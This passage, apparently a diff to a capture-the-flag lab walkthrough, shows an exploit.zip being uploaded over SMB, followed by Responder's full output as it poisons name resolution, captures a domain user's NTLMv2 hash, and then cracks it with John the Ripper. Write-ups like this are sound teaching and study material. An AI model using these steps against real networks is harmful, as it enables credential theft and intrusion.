@@ -248,3 +248,91 @@ and then upload the exploit.zip file to the victim via smb
 smb: \> put exploit.zip
 # output: putting file exploit.zip as \exploit.zip (0.9 kb/s) (average 0.9 kb/s)
 ```
+
+The output of Responder
+```bash
+  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
+  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
+  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
+                   |__|
+
+[*] Sponsor Responder: https://paypal.me/PythonResponder
+
+[+] Poisoners:
+    LLMNR                      [ON]
+    NBT-NS                     [ON]
+    MDNS                       [ON]
+    DNS                        [ON]
+    DHCP                       [OFF]
+
+[+] Servers:
+    HTTP server                [ON]
+    HTTPS server               [ON]
+    WPAD proxy                 [OFF]
+    Auth proxy                 [OFF]
+    SMB server                 [ON]
+    Kerberos server            [ON]
+    SQL server                 [ON]
+    FTP server                 [ON]
+    IMAP server                [ON]
+    POP3 server                [ON]
+    SMTP server                [ON]
+    DNS server                 [ON]
+    LDAP server                [ON]
+    MQTT server                [ON]
+    RDP server                 [ON]
+    DCE-RPC server             [ON]
+    WinRM server               [ON]
+    SNMP server                [ON]
+
+[+] HTTP Options:
+    Always serving EXE         [OFF]
+    Serving EXE                [OFF]
+    Serving HTML               [OFF]
+    Upstream Proxy             [OFF]
+
+[+] Poisoning Options:
+    Analyze Mode               [OFF]
+    Force WPAD auth            [OFF]
+    Force Basic Auth           [OFF]
+    Force LM downgrade         [OFF]
+    Force ESS downgrade        [OFF]
+
+[+] Generic Options:
+    Responder NIC              [tun0]
+    Responder IP               [10.10.14.71]
+    Responder IPv6             [dead:beef:2::1045]
+    Challenge set              [random]
+    Don't Respond To Names     ['ISATAP', 'ISATAP.LOCAL']
+    Don't Respond To MDNS TLD  ['_DOSVC']
+    TTL for poisoned response  [default]
+
+[+] Current Session Variables:
+    Responder Machine Name     [WIN-I81RVRMIPAF]
+    Responder Domain Name      [DEDN.LOCAL]
+    Responder DCE-RPC Port     [47155]
+
+[*] Version: Responder 3.1.6.0
+[*] Author: Laurent Gaffie, <lgaffie@secorizon.com>
+
+[+] Listening for events...
+
+[!] Error starting TCP server on port 80, check permissions or other servers running.
+[!] Error starting TCP server on port 25, check permissions or other servers running.
+[!] Error starting TCP server on port 53, check permissions or other servers running.
+[SMB] NTLMv2-SSP Client   : 10.10.11.69
+[SMB] NTLMv2-SSP Username : FLUFFY\p.agila
+[SMB] NTLMv2-SSP Hash     : p.agila::FLUFFY:f5f53c91ba63b18d:271154115FA86050FAEEF808A8BD80CE:010100000000000000C529CA06EADB01E301D5EBC93708F500000000020008004400450044004E0001001E00570049004E002D004900380031005200560052004D00490050004100460004003400570049004E002D004900380031005200560052004D0049005000410046002E004400450044004E002E004C004F00430041004C00030014004400450044004E002E004C004F00430041004C00050014004400450044004E002E004C004F00430041004C000700080000C529CA06EADB010600040002000000080030003000000000000000010000000020000098BFC77C0C6787ABF3570F320C9520487288FC2FE9DFF6A6020A44164658AEA70A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310034002E00370031000000000000000000
+[*] Skipping previously captured hash for FLUFFY\p.agila
+[*] Skipping previously captured hash for FLUFFY\p.agila
+[*] Skipping previously captured hash for FLUFFY\p.agila
+[*] Skipping previously captured hash for FLUFFY\p.agila
+[*] Skipping previously captured hash for FLUFFY\p.agila
+[*] Skipping previously captured hash for FLUFFY\p.agila
+
+```
+
+We got the hash of the user p.agila lets save this in a file and crack this using john
+```bash
+john p.agila.hash
+```
